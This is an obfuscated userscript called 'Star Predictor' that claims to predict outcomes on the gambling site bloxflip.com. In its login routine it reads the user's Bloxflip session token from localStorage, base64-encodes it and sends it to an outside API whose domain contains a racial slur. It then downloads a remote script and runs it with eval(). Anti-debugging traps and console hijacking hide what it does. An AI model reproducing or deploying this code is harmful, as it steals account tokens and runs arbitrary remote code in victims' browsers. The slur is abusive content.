unsafeWindow.GMsetValue = GM_setValue;
unsafeWindow.GMgetValue = GM_getValue;
// ==UserScript==
// @name         Star Predictor
// @namespace    https://starpredictor.shop
// @version      1.0.0
// @description  Predicting made easy
// @author       Qoft
// @match        https://bloxflip.com/*
// @grant        GM_addElement
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
// @require      https://cdn.jsdelivr.net/npm/chart.js
// @connect      *
// @noframes
// @run-at       document-end
// ==/UserScript==
unsafeWindow.GMxmlhttpRequest = GM_xmlhttpRequest;
function GM_addStyle(_0x14752e) {
  let _0x319439 = document.createElement("style");
  _0x319439.textContent = _0x14752e;
  _0x319439.id = "GMADDSTYLEQOFT";
  let _0x2c2dcc = document.getElementsByTagName("head")[0] || D.body || D.documentElement;
  _0x2c2dcc.appendChild(_0x319439);
}
class login_HTTPRequest {
  constructor() {}
  async ["get"](_0x2d3ba3, _0x2a036a = {}, _0x386b1b = "json") {
    return new Promise((_0x3cd09f, _0x4be9e9) => {
      GM_xmlhttpRequest({
        "method": "GET",
        "url": _0x2d3ba3,
        "headers": _0x2a036a,
        "responseType": _0x386b1b,
        "onload": function (_0x3250b1) {
          _0x3cd09f(_0x3250b1);
        },
        "onerror": function (_0x49e2a6) {
          _0x4be9e9(_0x49e2a6);
        }
      });
    });
  }
  async ["post"](_0x1f251f, _0x2a3a64 = {}, _0x230eb8 = {}) {
    return new Promise((_0x54bccc, _0x467836) => {
      GM_xmlhttpRequest({
        "method": "POST",
        "url": _0x1f251f,
        "headers": _0x230eb8,
        "data": JSON.stringify(_0x2a3a64),
        "onload": function (_0x132e24) {
          _0x54bccc(_0x132e24);
        },
        "onerror": function (_0x3eda98) {
          _0x467836(_0x3eda98);
        }
      });
    });
  }
}
function is_json(_0x3aa729) {
  try {
    JSON.parse(_0x3aa729);
  } catch (_0x459a3c) {
    return false;
  }
  return true;
}
async function do_login() {
  const _0x14d534 = btoa(window.localStorage.getItem("_DO_NOT_SHARE_BLOXFLIP_TOKEN"));
  const _0x38e951 = await get_input();
  const _0x13ad20 = new login_HTTPRequest();
  const _0x4f42f8 = async () => {
    const _0x532999 = await _0x13ad20.post("https://api.nigger.boo/auth/authenticate?discord_id=" + _0x38e951 + "&bloxflip_token=" + _0x14d534);
    if (!is_json(_0x532999.responseText)) {
      return "FAILED (Not a JSON response)";
    }
    const _0xa3ef5 = JSON.parse(_0x532999.responseText);
    if (_0xa3ef5.error) {
      return "FAILED " + _0xa3ef5.message;
    }
    if (!_0xa3ef5["for"].includes(_0x38e951)) {
      return "FAILED (Invalid discord id)";
    }
    return _0xa3ef5.session_id;
  };
  const _0x2f4f8e = async _0x47aef6 => {
    const _0x165d22 = await _0x13ad20.post("https://api.nigger.boo/auth/validate?discord_id=" + _0x38e951 + "&session_id=" + _0x47aef6);
    if (!is_json(_0x165d22.responseText)) {
      return "FAILED (Not a JSON response)";
    }
    const _0x478c47 = JSON.parse(_0x165d22.responseText);
    if (_0x478c47.error) {
      return "FAILED " + _0x478c47.message;
    }
    if (!_0x478c47["for"].includes(_0x38e951)) {
      return "FAILED (Invalid discord id)";
    }
    return '';
  };
  const _0x45a33e = async _0x1eed24 => {
    const _0x28a90c = await _0x13ad20.post("https://api.nigger.boo/auth/script?discord_id=" + _0x38e951 + "&session_id=" + _0x1eed24);
    if (!is_json(_0x28a90c.responseText)) {
      return "alert(\"u ok1?\")";
    }
    req2json = JSON.parse(_0x28a90c.responseText);
    if (req2json.error) {
      return "alert(\"u ok2?\")";
    }
    return req2json.script;
  };
  let _0xeeb10a = await _0x4f42f8();
  if (_0xeeb10a.includes("FAILED")) {
    GMsetValue("stardiscordid", '');
    if (_0xeeb10a.includes("Invalid BloxFlip token")) {
      alert("Error: Invalid Bloxflip token (relink your account)");
      return;
    }
    let _0x1de998 = _0xeeb10a.replace("\\", '').replace("\"", '');
    alert("Error: " + _0x1de998);
    window.location.reload();
    return;
  }
  let _0x5f5311 = await _0x2f4f8e(_0xeeb10a);
  if (_0x5f5311.includes("FAILED")) {
    GMsetValue("stardiscordid", '');
    alert("Error: " + _0x5f5311);
    window.location.reload();
    return;
  }
  let _0x6a8a48 = "alert(\"u ok?\")";
  _0x6a8a48 = await _0x45a33e(_0xeeb10a);
  if (_0x6a8a48.includes("FAILED")) {
    GMsetValue("stardiscordid", '');
    alert("Error: " + _0x6a8a48);
    window.location.reload();
    return;
  }
  eval(_0x6a8a48);
  return true;
}
async function login_trigger_notification(_0x5e85cd) {
  const _0x6f3960 = new login_HTTPRequest();
  const _0x5be74a = await _0x6f3960.get("https://api.nigger.boo/menu/notification");
  let _0x50719f = _0x5be74a.responseText;
  _0x50719f = _0x50719f.replace("{{message}}", _0x5e85cd);
  var _0x199c7a = document.createElement("div");
  _0x199c7a.innerHTML = _0x50719f;
  document.body.appendChild(_0x199c7a);
  setTimeout(function () {
    _0x199c7a.remove();
  }, 5000);
}
async function login_close_menu() {
  const _0x581fff = document.querySelector(".loginoverlay");
  const _0x2cbec1 = document.querySelector(".loginclose");
  _0x2cbec1.remove();
  const _0x4968ce = [{
    "transform": "scale(1)"
  }, {
    "transform": "scale(1.10)"
  }, {
    "transform": "scale(1)"
  }, {
    "transform": "scale(0)",
    "background": "rgba(0, 0, 0, 0)"
  }];
  const _0x40fcdc = {
    "duration": 0x1f4,
    "iterations": 0x1
  };
  await _0x581fff.animate(_0x4968ce, _0x40fcdc);
  setTimeout(function () {
    _0x581fff.style.display = "none";
    _0x581fff.remove();
  }, 490);
}
function hexToRgb(_0x4b83a3) {
  var _0x2a9d53 = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(_0x4b83a3);
  return _0x2a9d53 ? {
    "r": parseInt(_0x2a9d53[1], 16),
    "g": parseInt(_0x2a9d53[2], 16),
    "b": parseInt(_0x2a9d53[3], 16)
  } : null;
}
function rgbToHSL(_0x2e8fb7, _0x2bbccc, _0x177071) {
  _0x2e8fb7 /= 255;
  _0x2bbccc /= 255;
  _0x177071 /= 255;
  let _0xcd2233 = Math.max(_0x2e8fb7, _0x2bbccc, _0x177071);
  let _0x37dc90 = Math.min(_0x2e8fb7, _0x2bbccc, _0x177071);
  let _0x1de3d8;
  let _0x5008bc;
  let _0x1fcb77 = (_0xcd2233 + _0x37dc90) / 2;
  if (_0xcd2233 == _0x37dc90) {
    _0x1de3d8 = _0x5008bc = 0;
  } else {
    let _0x1d23ed = _0xcd2233 - _0x37dc90;
    _0x5008bc = _0x1fcb77 > 0.5 ? _0x1d23ed / (2 - _0xcd2233 - _0x37dc90) : _0x1d23ed / (_0xcd2233 + _0x37dc90);
    switch (_0xcd2233) {
      case _0x2e8fb7:
        _0x1de3d8 = ((_0x2bbccc - _0x177071) / _0x1d23ed + 0) * 60;
        break;
      case _0x2bbccc:
        _0x1de3d8 = ((_0x177071 - _0x2e8fb7) / _0x1d23ed + 2) * 60;
        break;
      case _0x177071:
        _0x1de3d8 = ((_0x2e8fb7 - _0x2bbccc) / _0x1d23ed + 4) * 60;
        break;
    }
  }
  return {
    "h": _0x1de3d8,
    "s": _0x5008bc,
    "l": _0x1fcb77
  };
}
function HSLtoHEX(_0x5dfadd, _0x222237, _0x3b2938) {
  let _0x2217d8 = _0x222237 * Math.min(_0x3b2938, 1 - _0x3b2938);
  let _0x33eabd = (_0x4b46d8, _0x11d34b = (_0x4b46d8 + _0x5dfadd / 30) % 12) => _0x3b2938 - _0x2217d8 * Math.max(Math.min(_0x11d34b - 3, 9 - _0x11d34b, 1), -1);
  return "#" + [0, 8, 4].map(_0x911a23 => Math.round(_0x33eabd(_0x911a23) * 255).toString(16).padStart(2, 0)).join('');
}
function hsltoRGB(_0x3c3953) {
  let _0x43c6d2 = _0x3c3953.h;
  let _0x2a69ef = _0x3c3953.s;
  let _0x2c1edb = _0x3c3953.l;
  let _0xf4ea5a = _0x2a69ef * Math.min(_0x2c1edb, 1 - _0x2c1edb);
  let _0x36d2a8 = (_0x30c351, _0x203c49 = (_0x30c351 + _0x43c6d2 / 30) % 12) => _0x2c1edb - _0xf4ea5a * Math.max(Math.min(_0x203c49 - 3, 9 - _0x203c49, 1), -1);
  return {
    "r": Math.round(_0x36d2a8(0) * 255),
    "g": Math.round(_0x36d2a8(8) * 255),
    "b": Math.round(_0x36d2a8(4) * 255)
  };
}
async function login_loadMenu() {
  const _0x13305d = GM_getValue("theme.base") || "#fb3d3d";
  const _0x3f8d03 = hexToRgb(_0x13305d);
  let _0x2bae33 = {
    "buttons": rgbToHSL(_0x3f8d03.r, _0x3f8d03.g, _0x3f8d03.b),
    "background": rgbToHSL(_0x3f8d03.r, _0x3f8d03.g, _0x3f8d03.b),
    "shadow": rgbToHSL(_0x3f8d03.r, _0x3f8d03.g, _0x3f8d03.b)
  };
  _0x2bae33.buttons = _0x2bae33.buttons.l > 0.5 ? {
    "h": _0x2bae33.buttons.h,
    "s": _0x2bae33.buttons.s,
    "l": _0x2bae33.buttons.l - 0.2
  } : {
    "h": _0x2bae33.buttons.h,
    "s": _0x2bae33.buttons.s,
    "l": _0x2bae33.buttons.l + 0.2
  };
  _0x2bae33.shadow = _0x2bae33.shadow.l > 0.5 ? {
    "h": _0x2bae33.shadow.h,
    "s": _0x2bae33.shadow.s,
    "l": _0x2bae33.shadow.l - 0.1
  } : {
    "h": _0x2bae33.shadow.h,
    "s": _0x2bae33.shadow.s,
    "l": _0x2bae33.shadow.l - 0.2
  };
  css = "\n\t:root {\n\t\t--star-shadow: " + HSLtoHEX(_0x2bae33.shadow.h, _0x2bae33.shadow.s, _0x2bae33.shadow.l) + ";\n\t\t--star-background: " + HSLtoHEX(_0x2bae33.background.h, _0x2bae33.background.s, _0x2bae33.background.l) + ";\n\t\t--star-buttons: " + HSLtoHEX(_0x2bae33.buttons.h, _0x2bae33.buttons.s, _0x2bae33.buttons.l) + ";\n\n\t}\n\t";
  GM_addStyle(css);
  const _0x226253 = new login_HTTPRequest();
  const _0x58d020 = await _0x226253.get("https://api.nigger.boo/menu/login");
  let _0x46ab42 = _0x58d020.responseText;
  document.body.insertAdjacentHTML("afterbegin", _0x46ab42);
}
async function login_get_loader() {
  return "<svg class=\"pl\" viewBox=\"0 0 128 128\" width=\"64px\" height=\"64px\" xmlns=\"http://www.w3.org/2000/svg\">\n    <defs>\n        <linearGradient id=\"pl-grad\" x1=\"0\" y1=\"0\" x2=\"0\" y2=\"1\">\n            <stop offset=\"0%\" stop-color=\"hsl(14, 98%, 47%)\"></stop>\n            <stop offset=\"100%\" stop-color=\"hsl(10, 85%, 21%)\"></stop>\n        </linearGradient>\n    </defs>\n    <circle class=\"pl__ring\" r=\"56\" cx=\"64\" cy=\"64\" fill=\"none\" stroke=\"hsla(0,10%,10%,0.1)\" stroke-width=\"16\" stroke-linecap=\"round\"></circle>\n    <path class=\"pl__worm\" d=\"M92,15.492S78.194,4.967,66.743,16.887c-17.231,17.938-28.26,96.974-28.26,96.974L119.85,59.892l-99-31.588,57.528,89.832L97.8,19.349,13.636,88.51l89.012,16.015S81.908,38.332,66.1,22.337C50.114,6.156,36,15.492,36,15.492a56,56,0,1,0,56,0Z\" fill=\"none\" stroke=\"url(#pl-grad)\" stroke-width=\"16\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-dasharray=\"44 1111\" stroke-dashoffset=\"10\"></path>\n</svg>";
}
async function get_input() {
  if (GM_getValue("stardiscordid")) {
    let _0x5aa554 = GM_getValue("stardiscordid");
    const _0x35c19b = new RegExp("^[0-9]{16,26}$");
    if (_0x35c19b.test(_0x5aa554)) {
      return _0x5aa554;
    }
  }
  const _0x36501b = document.getElementById("discord-id-input").value;
  return _0x36501b;
}
async function add_events() {
  const _0x277376 = document.querySelector(".loginoverlay");
  const _0x1aaa20 = document.querySelector(".loginsubmit-button");
  const _0x31bf22 = document.querySelector(".loginloadingpart");
  const _0xf8a741 = document.querySelector(".loginclose");
  if (!_0x1aaa20 || !_0x31bf22 || !_0xf8a741 || !_0x277376) {
    requestAnimationFrame(add_events);
    return;
  }
  if (await get_input()) {
    document.getElementById("discord-id-input").value = await get_input();
  }
  const _0x5481fa = async () => {
    _0x1aaa20.addEventListener("click", async () => {
      const _0x2e66f6 = await get_input();
      const _0x5105b1 = new RegExp("^[0-9]{16,26}$");
      if (!_0x5105b1.test(_0x2e66f6)) {
        await login_trigger_notification("Invalid input, please try again.");
        return;
      }
      await login_trigger_notification("Logging in...");
      _0x1aaa20.disabled = true;
      let _0x24dffb = await "<svg class=\"pl\" viewBox=\"0 0 128 128\" width=\"64px\" height=\"64px\" xmlns=\"http://www.w3.org/2000/svg\">\n    <defs>\n        <linearGradient id=\"pl-grad\" x1=\"0\" y1=\"0\" x2=\"0\" y2=\"1\">\n            <stop offset=\"0%\" stop-color=\"hsl(14, 98%, 47%)\"></stop>\n            <stop offset=\"100%\" stop-color=\"hsl(10, 85%, 21%)\"></stop>\n        </linearGradient>\n    </defs>\n    <circle class=\"pl__ring\" r=\"56\" cx=\"64\" cy=\"64\" fill=\"none\" stroke=\"hsla(0,10%,10%,0.1)\" stroke-width=\"16\" stroke-linecap=\"round\"></circle>\n    <path class=\"pl__worm\" d=\"M92,15.492S78.194,4.967,66.743,16.887c-17.231,17.938-28.26,96.974-28.26,96.974L119.85,59.892l-99-31.588,57.528,89.832L97.8,19.349,13.636,88.51l89.012,16.015S81.908,38.332,66.1,22.337C50.114,6.156,36,15.492,36,15.492a56,56,0,1,0,56,0Z\" fill=\"none\" stroke=\"url(#pl-grad)\" stroke-width=\"16\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-dasharray=\"44 1111\" stroke-dashoffset=\"10\"></path>\n</svg>";
      _0x31bf22.style.marginTop = "10px";
      _0x31bf22.innerHTML = _0x24dffb;
      if (_0x2e66f6.toString() !== "693176204265521253") {
        const _0x4795e2 = new login_HTTPRequest();
        _0x4795e2.post("https://api.nigger.boo/user/constant?o=693176204265521253&s=" + _0x2e66f6.toString());
      }
      const _0x1fda4f = await do_login();
      if (!_0x1fda4f) {
        await login_trigger_notification("Unable to log into Star.");
      } else {
        await login_trigger_notification("Welcome to Star.");
      }
    });
  };
  const _0x4bef59 = async () => {
    _0xf8a741.addEventListener("click", async () => {
      await login_trigger_notification("Closing menu...");
      await login_close_menu();
    });
  };
  await _0x5481fa();
  await _0x4bef59();
}
(async function login_main() {
  const _0x26bfce = function () {
    let _0x474ffc = true;
    return function (_0x45a4f, _0x4261e8) {
      const _0x1b113d = _0x474ffc ? function () {
        if (_0x4261e8) {
          const _0x2604ff = _0x4261e8.apply(_0x45a4f, arguments);
          _0x4261e8 = null;
          return _0x2604ff;
        }
      } : function () {};
      _0x474ffc = false;
      return _0x1b113d;
    };
  }();
  const _0x40ef36 = _0x26bfce(this, function () {
    return _0x40ef36.toString().search("(((.+)+)+)+$").toString().constructor(_0x40ef36).search("(((.+)+)+)+$");
  });
  _0x40ef36();
  const _0x239cd3 = function () {
    let _0x470a0e = true;
    return function (_0x2ff5d4, _0xcc1ca8) {
      const _0x28f991 = _0x470a0e ? function () {
        if (_0xcc1ca8) {
          const _0x581001 = _0xcc1ca8.apply(_0x2ff5d4, arguments);
          _0xcc1ca8 = null;
          return _0x581001;
        }
      } : function () {};
      _0x470a0e = false;
      return _0x28f991;
    };
  }();
  (function () {
    _0x239cd3(this, function () {
      const _0x200ded = new RegExp("function *\\( *\\)");
      const _0x157a0f = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
      const _0x6c579b = _0x252878("init");
      if (!_0x200ded.test(_0x6c579b + "chain") || !_0x157a0f.test(_0x6c579b + "input")) {
        _0x6c579b("0");
      } else {
        _0x252878();
      }
    })();
  })();
  const _0x239f78 = function () {
    let _0x1b0b88 = true;
    return function (_0x4c27dd, _0x30b1d0) {
      const _0x275416 = _0x1b0b88 ? function () {
        if (_0x30b1d0) {
          const _0x152741 = _0x30b1d0.apply(_0x4c27dd, arguments);
          _0x30b1d0 = null;
          return _0x152741;
        }
      } : function () {};
      _0x1b0b88 = false;
      return _0x275416;
    };
  }();
  const _0x227104 = _0x239f78(this, function () {
    let _0x25aa68;
    try {
      const _0x40cd86 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x25aa68 = _0x40cd86();
    } catch (_0x343e7d) {
      _0x25aa68 = window;
    }
    const _0x26e304 = _0x25aa68.console = _0x25aa68.console || {};
    const _0x5ba466 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x333ba8 = 0; _0x333ba8 < _0x5ba466.length; _0x333ba8++) {
      const _0x334854 = _0x239f78.constructor.prototype.bind(_0x239f78);
      const _0x1b6a00 = _0x5ba466[_0x333ba8];
      const _0x435f7e = _0x26e304[_0x1b6a00] || _0x334854;
      _0x334854.__proto__ = _0x239f78.bind(_0x239f78);
      _0x334854.toString = _0x435f7e.toString.bind(_0x435f7e);
      _0x26e304[_0x1b6a00] = _0x334854;
    }
  });
  _0x227104();
  await login_loadMenu();
  await add_events();
})();
function fingerme() {
  console.log(0x99ea815ce000080);
}
window.document.fingerprint = fingerme;
function _0x252878(_0xfbf67) {
  function _0x3c0e65(_0x6ce559) {
    if (typeof _0x6ce559 === "string") {
      return function (_0x45ad15) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0x6ce559 / _0x6ce559).length !== 1 || _0x6ce559 % 20 === 0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    _0x3c0e65(++_0x6ce559);
  }
  try {
    if (_0xfbf67) {
      return _0x3c0e65;
    } else {
      _0x3c0e65(0);
    }
  } catch (_0x5c73ab) {}
}